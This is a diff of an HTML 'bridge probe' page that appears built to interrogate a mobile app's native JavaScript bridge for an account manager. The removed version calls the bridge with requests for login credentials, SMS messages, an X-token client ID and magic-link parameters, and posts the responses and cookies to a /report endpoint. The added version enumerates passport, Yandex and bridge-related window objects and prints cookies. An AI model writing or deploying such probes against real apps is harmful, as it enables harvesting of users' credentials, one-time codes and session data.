@@ -2,11 +2,11 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Sim Bridge Probe</title>
+<title>Sim Bridge Probe v2</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 <body style="font-family:monospace;background:#111;color:#0f0;padding:10px;font-size:11px;word-break:break-all;">
-<pre id="out">BRIDGE PROBE
+<pre id="out">BRIDGE PROBE v2
 </pre>
 <script>
 (function () {
@@ -14,56 +14,54 @@
 
     function log(s) {
         out.textContent += '\n' + s;
-        fetch('/report', {method: 'POST', body: String(s).slice(0, 4000)});
+    }
+
+    function describe(obj, name, depth) {
+        try {
+            if (obj === null || obj === undefined) { log(name + '=' + obj); return; }
+            var t = typeof obj;
+            if (t !== 'object' && t !== 'function') { log(name + '(' + t + ')=' + String(obj).slice(0, 120)); return; }
+            var props = [];
+            try { props = Object.getOwnPropertyNames(obj); } catch (e) { props = ['<enum err ' + e + '>']; }
+            log(name + '(' + t + ') props: ' + props.slice(0, 40).join(','));
+            if (depth > 0) {
+                props.slice(0, 15).forEach(function (p) {
+                    try {
+                        var v = obj[p];
+                        if (v !== null && typeof v !== 'undefined' && p !== 'window' && p !== 'document' && p !== 'self' && p !== 'top' && p !== 'parent' && p !== 'frames') {
+                            describe(v, name + '.' + p, depth - 1);
+                        }
+                    } catch (e) {}
+                });
+            }
+        } catch (e) { log(name + ' err ' + e); }
     }
 
     log('URL: ' + location.href);
-    log('UA: ' + navigator.userAgent);
 
-    var keys = Object.getOwnPropertyNames(window).filter(function (k) {
-        return /native|AM|passport|sim|Sim|yandex|Yandex|flutter|Flutter/i.test(k);
-    });
-    log('WINDOW KEYS: ' + keys.join(', '));
-
-    var na = window.nativeAMAndroid;
-
-    if (!na) {
-        log('!! nativeAMAndroid NOT FOUND');
-    } else {
-        var methods = [];
-        for (var m in na) methods.push(m + ':' + typeof na[m]);
-        log('nativeAMAndroid methods: ' + methods.join(', '));
-
-        window.nativeAMResponse = {
-            receive: function (reqId, json) {
-                log('<<< RESPONSE ' + reqId + ' :: ' + JSON.stringify(json));
-            }
-        };
-
-        var seq = [
-            {message: 'ready', data: {}},
-            {message: 'requestLoginCredentials', data: {}},
-            {message: 'getSms', data: {}},
-            {message: 'getXTokenClientId', data: {}},
-            {message: 'requestMagicLinkParams', data: {}},
-            {message: 'chooseAccount', data: {}}
-        ];
-
-        seq.forEach(function (msg, i) {
-            setTimeout(function () {
-                var id = 'probe' + i + '_' + Date.now();
-                var payload = {version: '1.0', message: msg.message, requestId: id, data: msg.data};
-                try {
-                    na.send(JSON.stringify(payload));
-                    log('>>> sent ' + msg.message + ' (' + id + ')');
-                } catch (e) {
-                    log('send error ' + msg.message + ': ' + e);
-                }
-            }, 500 + i * 900);
-        });
+    // 1. AM environment marker
+    describe(window.__IS__AM__ENVIRONMENT__, '__IS__AM__ENVIRONMENT__', 2);
+    if (typeof window.__IS__AM__ENVIRONMENT__ === 'function') {
+        try { log('call __IS__AM__ENVIRONMENT__() = ' + String(window.__IS__AM__ENVIRONMENT__()).slice(0, 100)); } catch (e) { log('call err ' + e); }
     }
 
+    // 2. cider
+    describe(window.cider, 'cider', 1);
+
+    // 3. любые ключи с native/am/passport
+    var keys = Object.getOwnPropertyNames(window).filter(function (k) {
+        return /native|AM|passport|sim|yandex|Ya|bridge|Bridge/i.test(k);
+    });
+    log('ALL KEYS: ' + keys.join(', '));
+    keys.forEach(function (k) {
+        if (k !== '__IS__AM__ENVIRONMENT__' && k !== 'cider') describe(window[k], k, 1);
+    });
+
+    // 4. есть ли iframe-доступ и Yandex objects
+    ['Ya', 'Yandex', 'ym', 'passport'].forEach(function (k) { if (window[k]) describe(window[k], k, 1); });
+
     log('COOKIE: ' + (document.cookie || '(empty)'));
+    log('--- PROBE v2 END ---');
 })();
 </script>
 </body>
